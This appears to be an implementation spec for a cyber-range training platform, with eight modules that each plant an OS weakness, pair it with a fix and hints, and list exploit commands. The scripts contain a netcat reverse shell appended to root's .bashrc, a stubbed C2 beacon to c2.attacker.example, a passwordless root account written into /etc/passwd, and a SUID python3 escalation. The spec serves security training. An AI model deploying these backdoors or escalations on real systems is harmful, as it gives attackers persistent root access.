# Standalone OS-Level Vulnerability Modules — Implementation Spec

**Date:** 2026-04-14
**Status:** Implementation-ready
**Parent spec:** `2026-04-13-module-expansion-design.md`

---

## Overview

Eight standalone vulnerability modules covering four categories: network, privilege escalation, persistence, and configuration. Each is self-contained under `modules/vulns/<id>/` with a YAML definition and a shell script. No `requires` dependencies — these can be selected independently of any application module.

---

## Directory Structure

```
modules/vulns/
├── open_telnet/
│   ├── open_telnet.yaml
│   └── open_telnet.sh
├── anonymous_ftp/
│   ├── anonymous_ftp.yaml
│   └── anonymous_ftp.sh
├── suid_python/
│   ├── suid_python.yaml
│   └── suid_python.sh
├── writable_passwd/
│   ├── writable_passwd.yaml
│   └── writable_passwd.sh
├── malicious_cron_beacon/
│   ├── malicious_cron_beacon.yaml
│   └── malicious_cron_beacon.sh
├── backdoor_bashrc/
│   ├── backdoor_bashrc.yaml
│   └── backdoor_bashrc.sh
├── ip_forwarding_enabled/
│   ├── ip_forwarding_enabled.yaml
│   └── ip_forwarding_enabled.sh
└── core_dumps_unrestricted/
    ├── core_dumps_unrestricted.yaml
    └── core_dumps_unrestricted.sh
```

---

## Network Modules

### `open_telnet.yaml`

```yaml
id: open_telnet
name: Telnet Service Enabled
description: The telnetd service is installed and running, exposing an unencrypted remote login interface on port 23. All credentials and session data are transmitted in cleartext.
type: vulnerability
difficulty: easy
points: 100
category: network
tags: [network, telnet, cleartext, services]
conflicts: []
requires: []
script: open_telnet.sh
verification:
  type: port_closed
  port: 23
suggested_fix: "Stop and disable the telnet service, then remove the package: systemctl stop inetd && systemctl disable inetd && apt-get remove -y telnetd xinetd"
hints:
  - "Scan this machine for legacy remote access services"
  - "Check if any unencrypted remote login services are running on standard ports"
  - "Disable and remove the telnet daemon: systemctl stop inetd && systemctl disable inetd && apt-get remove -y telnetd xinetd"
caldera:
  tactic: initial-access
  technique:
    attack_id: T1133
    name: "External Remote Services"
  recon:
    description: "Check if telnet is listening on port 23"
    command: |
      ss -tlnp | grep -q ":23" && echo "VULNERABLE: telnet is listening on port 23" || echo "SECURE: port 23 is not listening"
  exploit:
    description: "Connect to telnet and attempt login with default credentials"
    command: |
      timeout 5 bash -c 'echo -e "root\nchangeme123\n" | nc -q 3 localhost 23' 2>/dev/null | head -10 || echo "Telnet port is open (connect manually for interactive login)"
```

### `open_telnet.sh`

```bash
#!/bin/bash
apt-get install -y telnetd xinetd
systemctl enable xinetd
systemctl start xinetd
```

---

### `anonymous_ftp.yaml`

```yaml
id: anonymous_ftp
name: Anonymous FTP Access
description: The vsftpd FTP server is configured with anonymous_enable=YES, allowing unauthenticated read access to the FTP root directory. Sensitive files left in the FTP root are exposed to any network client.
type: vulnerability
difficulty: medium
points: 200
category: network
tags: [network, ftp, anonymous, unauthenticated, services]
conflicts: []
requires: []
script: anonymous_ftp.sh
verification:
  type: file_not_contains
  path: /etc/vsftpd.conf
  pattern: "anonymous_enable=YES"
suggested_fix: "Edit /etc/vsftpd.conf and change anonymous_enable=YES to anonymous_enable=NO, then restart vsftpd: systemctl restart vsftpd"
hints:
  - "Check FTP server configuration for authentication requirements"
  - "Review the vsftpd configuration file for anonymous access settings"
  - "Set anonymous_enable=NO in /etc/vsftpd.conf and restart vsftpd: systemctl restart vsftpd"
caldera:
  tactic: initial-access
  technique:
    attack_id: T1133
    name: "External Remote Services"
  recon:
    description: "Check if anonymous FTP login is enabled"
    command: |
      grep -q "anonymous_enable=YES" /etc/vsftpd.conf && echo "VULNERABLE: anonymous FTP access enabled" || echo "SECURE: anonymous FTP is disabled"
  exploit:
    description: "Log in to FTP as anonymous and list/download files"
    command: |
      ftp -inv localhost 21 <<EOF 2>/dev/null
      user anonymous ""
      ls
      bye
      EOF
```

### `anonymous_ftp.sh`

```bash
#!/bin/bash
apt-get install -y vsftpd
sed -i 's/^anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf
# Ensure the line exists if it wasn't there
grep -q "anonymous_enable" /etc/vsftpd.conf || echo "anonymous_enable=YES" >> /etc/vsftpd.conf
systemctl enable vsftpd
systemctl restart vsftpd
```

---

## Privilege Escalation Modules

### `suid_python.yaml`

```yaml
id: suid_python
name: SUID Bit on Python3
description: The SUID bit is set on /usr/bin/python3, allowing any local user to execute Python with root effective UID. This is a trivial privilege escalation path — one Python line spawns a root shell.
type: vulnerability
difficulty: medium
points: 200
category: filesystem
tags: [suid, permissions, privilege-escalation, python]
conflicts: []
requires: []
script: suid_python.sh
verification:
  type: file_permissions
  path: /usr/bin/python3
  expected: "755"
suggested_fix: "Remove the SUID bit from Python3: chmod u-s /usr/bin/python3 (or chmod 755 /usr/bin/python3)"
hints:
  - "Look for binaries with unusual SUID permissions"
  - "Check for SUID bits on interpreters and scripting runtimes"
  - "Remove the SUID bit: chmod 755 /usr/bin/python3"
caldera:
  tactic: privilege-escalation
  technique:
    attack_id: T1548.001
    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
  recon:
    description: "Check if python3 has the SUID bit set"
    command: |
      test -u /usr/bin/python3 && echo "VULNERABLE: SUID bit set on /usr/bin/python3" || echo "SECURE: python3 has normal permissions"
  exploit:
    description: "Escalate to root via SUID python3"
    command: |
      /usr/bin/python3 -c "import os; os.setuid(0); os.system('id')"
```

### `suid_python.sh`

```bash
#!/bin/bash
chmod u+s /usr/bin/python3
```

---

### `writable_passwd.yaml`

```yaml
id: writable_passwd
name: World-Writable /etc/passwd
description: The /etc/passwd file has world-write permissions (666), allowing any local user to add new root-level accounts or modify existing accounts without requiring sudo or root access.
type: vulnerability
difficulty: hard
points: 300
category: filesystem
tags: [permissions, privilege-escalation, filesystem, passwd]
conflicts: []
requires: []
script: writable_passwd.sh
verification:
  type: file_permissions
  path: /etc/passwd
  expected: "644"
suggested_fix: "Restore correct permissions on /etc/passwd: chmod 644 /etc/passwd"
hints:
  - "Check permissions on critical system authentication files"
  - "Look at the permissions on /etc/passwd — it should not be writable by everyone"
  - "Restore the correct permissions: chmod 644 /etc/passwd"
caldera:
  tactic: persistence
  technique:
    attack_id: T1136.001
    name: "Create Account: Local Account"
  recon:
    description: "Check if /etc/passwd is world-writable"
    command: |
      [ -w /etc/passwd ] && stat -c "%a" /etc/passwd | grep -q "6$" && echo "VULNERABLE: /etc/passwd is world-writable" || echo "SECURE: /etc/passwd is not world-writable"
  exploit:
    description: "Add a backdoor root account by writing directly to /etc/passwd"
    command: |
      echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
      echo "Backdoor root account 'backdoor' added (no password)"
      su -s /bin/bash backdoor -c "id"
```

### `writable_passwd.sh`

```bash
#!/bin/bash
chmod 666 /etc/passwd
```

---

## Persistence Modules

### `malicious_cron_beacon.yaml`

```yaml
id: malicious_cron_beacon
name: Malicious Cron Job (C2 Beacon)
description: A cron entry runs /opt/.hidden/beacon.sh every 5 minutes from root's crontab. The script simulates a C2 beacon — in a real attack this would exfiltrate data or maintain persistence by phoning home.
type: vulnerability
difficulty: medium
points: 200
category: persistence
tags: [persistence, cron, c2, beacon, malware]
conflicts: []
requires: []
script: malicious_cron_beacon.sh
verification:
  type: cron_not_present
  pattern: "beacon.sh"
suggested_fix: "Remove the malicious cron entry from root's crontab: crontab -l | grep -v beacon.sh | crontab - and delete the beacon script: rm -rf /opt/.hidden/"
hints:
  - "Review scheduled tasks for suspicious or unexpected entries"
  - "Check root's crontab for any unfamiliar scripts: crontab -l"
  - "Remove the beacon.sh cron entry (crontab -e or crontab -l | grep -v beacon | crontab -) and delete /opt/.hidden/"
caldera:
  tactic: persistence
  technique:
    attack_id: T1053.003
    name: "Scheduled Task/Job: Cron"
  recon:
    description: "Check if a malicious cron beacon is installed"
    command: |
      crontab -l 2>/dev/null | grep -q "beacon.sh" && echo "VULNERABLE: malicious cron beacon found" || echo "SECURE: no beacon.sh in crontab"
  exploit:
    description: "Execute the C2 beacon script manually to confirm functionality"
    command: |
      crontab -l | grep beacon
      cat /opt/.hidden/beacon.sh 2>/dev/null
      bash /opt/.hidden/beacon.sh 2>/dev/null && echo "Beacon executed successfully"
```

### `malicious_cron_beacon.sh`

```bash
#!/bin/bash
# Create hidden directory and beacon script
mkdir -p /opt/.hidden
cat > /opt/.hidden/beacon.sh << 'EOF'
#!/bin/bash
# C2 beacon stub — simulates data exfiltration
HOSTNAME=$(hostname)
IP=$(hostname -I | awk '{print $1}')
UPTIME=$(uptime -p)
echo "$(date): beacon from ${HOSTNAME} (${IP}) - ${UPTIME}" >> /opt/.hidden/beacon.log
# Real beacon would: curl -s https://c2.attacker.example/beacon -d "host=${HOSTNAME}&ip=${IP}"
EOF
chmod 755 /opt/.hidden/beacon.sh

# Add to root crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/.hidden/beacon.sh") | crontab -
```

---

### `backdoor_bashrc.yaml`

```yaml
id: backdoor_bashrc
name: Backdoor in Root .bashrc
description: A reverse shell one-liner has been appended to /root/.bashrc. Every time root opens an interactive shell, the backdoor attempts to connect back to the attacker's machine.
type: vulnerability
difficulty: easy
points: 100
category: persistence
tags: [persistence, backdoor, bashrc, reverse-shell]
conflicts: []
requires: []
script: backdoor_bashrc.sh
verification:
  type: file_not_contains
  path: /root/.bashrc
  pattern: "nc -e /bin/bash"
suggested_fix: "Edit /root/.bashrc and remove the line containing 'nc -e /bin/bash'. Alternatively: grep -v 'nc -e /bin/bash' /root/.bashrc > /tmp/bashrc_clean && mv /tmp/bashrc_clean /root/.bashrc"
hints:
  - "Check shell configuration files for unusual commands"
  - "Review /root/.bashrc for any unexpected lines at the end of the file"
  - "Remove the reverse shell line from /root/.bashrc: grep -v 'nc -e /bin/bash' /root/.bashrc > /tmp/b && mv /tmp/b /root/.bashrc"
caldera:
  tactic: persistence
  technique:
    attack_id: T1546.004
    name: "Event Triggered Execution: Unix Shell Configuration Modification"
  recon:
    description: "Check if /root/.bashrc contains a reverse shell backdoor"
    command: |
      grep -q "nc -e /bin/bash" /root/.bashrc && echo "VULNERABLE: reverse shell backdoor found in /root/.bashrc" || echo "SECURE: no reverse shell in /root/.bashrc"
  exploit:
    description: "Confirm the backdoor payload and display the callback address"
    command: |
      grep "nc -e /bin/bash" /root/.bashrc
      echo "Backdoor will fire on next root interactive login"
```

### `backdoor_bashrc.sh`

```bash
#!/bin/bash
echo 'nc -e /bin/bash 10.10.10.10 4444 &' >> /root/.bashrc
```

---

## Configuration Modules

### `ip_forwarding_enabled.yaml`

```yaml
id: ip_forwarding_enabled
name: IP Forwarding Enabled
description: Kernel IP forwarding is enabled via net.ipv4.ip_forward = 1 in /etc/sysctl.conf. This allows the machine to act as a router, forwarding packets between network interfaces — enabling network pivoting attacks if the host is compromised.
type: vulnerability
difficulty: easy
points: 100
category: configuration
tags: [network, configuration, kernel, pivoting]
conflicts: []
requires: []
script: ip_forwarding_enabled.sh
verification:
  type: file_not_contains
  path: /etc/sysctl.conf
  pattern: "net.ipv4.ip_forward = 1"
suggested_fix: "Edit /etc/sysctl.conf and remove or comment out the 'net.ipv4.ip_forward = 1' line, then apply: sysctl -p. Also disable at runtime: sysctl -w net.ipv4.ip_forward=0"
hints:
  - "Review kernel network configuration parameters"
  - "Check /etc/sysctl.conf for IP forwarding settings"
  - "Remove or comment out 'net.ipv4.ip_forward = 1' from /etc/sysctl.conf and apply with sysctl -p"
caldera:
  tactic: lateral-movement
  technique:
    attack_id: T1599
    name: "Network Boundary Bridging"
  recon:
    description: "Check if IP forwarding is enabled"
    command: |
      grep -q "net.ipv4.ip_forward = 1" /etc/sysctl.conf && echo "VULNERABLE: IP forwarding enabled in sysctl.conf" || \
      sysctl net.ipv4.ip_forward | grep -q "= 1" && echo "VULNERABLE: IP forwarding enabled at runtime" || echo "SECURE: IP forwarding is disabled"
  exploit:
    description: "Confirm IP forwarding is active and use for network pivoting"
    command: |
      sysctl net.ipv4.ip_forward
      ip route show
      echo "IP forwarding active — this host can be used as a network pivot"
```

### `ip_forwarding_enabled.sh`

```bash
#!/bin/bash
# Add to sysctl.conf if not already present
grep -q "net.ipv4.ip_forward" /etc/sysctl.conf || echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sed -i 's/^#*net.ipv4.ip_forward.*/net.ipv4.ip_forward = 1/' /etc/sysctl.conf
sysctl -p
```

---

### `core_dumps_unrestricted.yaml`

```yaml
id: core_dumps_unrestricted
name: Unrestricted Core Dumps
description: Core dump restrictions have been removed from /etc/security/limits.conf and fs.suid_dumpable is set to 2. This allows SUID processes to produce core dumps containing sensitive memory — including passwords, cryptographic keys, and other credentials that were in-memory at crash time.
type: vulnerability
difficulty: medium
points: 200
category: configuration
tags: [configuration, kernel, credentials, core-dump, information-disclosure]
conflicts: []
requires: []
script: core_dumps_unrestricted.sh
verification:
  type: file_contains
  path: /etc/security/limits.conf
  pattern: "hard core 0"
suggested_fix: "Re-add the core dump restriction to /etc/security/limits.conf: echo '* hard core 0' >> /etc/security/limits.conf. Also disable SUID core dumps: sysctl -w fs.suid_dumpable=0 and set fs.suid_dumpable=0 in /etc/sysctl.conf"
hints:
  - "Check system limits for core dump configuration"
  - "Look at /etc/security/limits.conf for core dump size limits and check fs.suid_dumpable via sysctl"
  - "Add '* hard core 0' to /etc/security/limits.conf and set fs.suid_dumpable=0 in /etc/sysctl.conf, then run sysctl -p"
caldera:
  tactic: credential-access
  technique:
    attack_id: T1003
    name: "OS Credential Dumping"
  recon:
    description: "Check if core dumps are unrestricted and SUID dumping is enabled"
    command: |
      sysctl fs.suid_dumpable | grep -q "= 2" && echo "VULNERABLE: SUID core dumps enabled (fs.suid_dumpable=2)" || \
      grep -q "hard core 0" /etc/security/limits.conf || echo "VULNERABLE: no core dump size limit in limits.conf"
      grep -q "hard core 0" /etc/security/limits.conf && echo "SECURE: core dump hard limit is set" || echo "VULNERABLE: missing hard core 0 in limits.conf"
  exploit:
    description: "Trigger a core dump from a SUID process and inspect for sensitive data"
    command: |
      sysctl fs.suid_dumpable
      ulimit -c
      echo "Core dumps unrestricted — crash a SUID process to dump its memory for credential extraction"
```

### `core_dumps_unrestricted.sh`

```bash
#!/bin/bash
# Remove core dump restriction from limits.conf
sed -i '/hard core 0/d' /etc/security/limits.conf

# Enable SUID core dumps via sysctl
grep -q "fs.suid_dumpable" /etc/sysctl.conf && \
  sed -i 's/^fs.suid_dumpable.*/fs.suid_dumpable = 2/' /etc/sysctl.conf || \
  echo "fs.suid_dumpable = 2" >> /etc/sysctl.conf
sysctl -p

# Set unlimited core dumps at runtime
ulimit -c unlimited
```

---

## Summary Table

| id | category | difficulty | points | verification type | script action |
|----|----------|-----------|--------|-------------------|---------------|
| `open_telnet` | network | easy | 100 | `port_closed` port=23 | Install + start telnetd/xinetd |
| `anonymous_ftp` | network | medium | 200 | `file_not_contains` vsftpd.conf | Install vsftpd, set anonymous=YES |
| `suid_python` | filesystem | medium | 200 | `file_permissions` /usr/bin/python3 expected=755 | `chmod u+s /usr/bin/python3` |
| `writable_passwd` | filesystem | hard | 300 | `file_permissions` /etc/passwd expected=644 | `chmod 666 /etc/passwd` |
| `malicious_cron_beacon` | persistence | medium | 200 | `cron_not_present` pattern=beacon.sh | Create beacon.sh + add to root crontab |
| `backdoor_bashrc` | persistence | easy | 100 | `file_not_contains` /root/.bashrc | Append reverse shell to .bashrc |
| `ip_forwarding_enabled` | configuration | easy | 100 | `file_not_contains` /etc/sysctl.conf | Set ip_forward=1 + `sysctl -p` |
| `core_dumps_unrestricted` | configuration | medium | 200 | `file_contains` /etc/security/limits.conf pattern=`hard core 0` | Remove limit, set suid_dumpable=2 |

---

## Verification Checklist

For each module, test on a fresh VM:

1. **open_telnet**: Run `open_telnet.sh` → `ss -tlnp | grep :23` → listening. Fix: `systemctl stop inetd && apt-get remove -y telnetd` → port closed.
2. **anonymous_ftp**: Run `anonymous_ftp.sh` → `grep anonymous_enable=YES /etc/vsftpd.conf` → found. Fix: `sed -i 's/YES/NO/' /etc/vsftpd.conf && systemctl restart vsftpd` → grep returns nothing.
3. **suid_python**: Run `suid_python.sh` → `stat -c "%a" /usr/bin/python3` → 4755. Fix: `chmod 755 /usr/bin/python3` → 755.
4. **writable_passwd**: Run `writable_passwd.sh` → `stat -c "%a" /etc/passwd` → 666. Fix: `chmod 644 /etc/passwd` → 644.
5. **malicious_cron_beacon**: Run `malicious_cron_beacon.sh` → `crontab -l | grep beacon.sh` → found. Fix: `crontab -l | grep -v beacon.sh | crontab - && rm -rf /opt/.hidden/` → not in crontab.
6. **backdoor_bashrc**: Run `backdoor_bashrc.sh` → `grep "nc -e /bin/bash" /root/.bashrc` → found. Fix: remove the line → grep returns nothing.
7. **ip_forwarding_enabled**: Run `ip_forwarding_enabled.sh` → `grep "net.ipv4.ip_forward = 1" /etc/sysctl.conf` → found. Fix: comment out + `sysctl -p` → grep returns nothing.
8. **core_dumps_unrestricted**: Run `core_dumps_unrestricted.sh` → `grep "hard core 0" /etc/security/limits.conf` → not found. Fix: re-add the line → grep returns `hard core 0`.

---

## Conflict and Dependency Notes

- No port conflicts among these modules or with any existing module.
- No file path conflicts with any existing module.
- `suid_python` sets SUID on `/usr/bin/python3` which is used by `audit.py` — SUID does not prevent normal execution (the kernel ignores SUID on scripts), so `audit.py` continues to work normally.
- `writable_passwd` is the highest-risk vuln in this set — it should not be combined with `writable_cron_script` (existing module) in the same quota as both create trivial root paths, which reduces challenge diversity.
- `malicious_cron_beacon` and `writable_cron_script` (existing) can coexist — they target different files (root crontab vs. a script file).
- `backdoor_bashrc` and `unauthorized_ssh_key` (existing) can coexist — different persistence mechanisms.
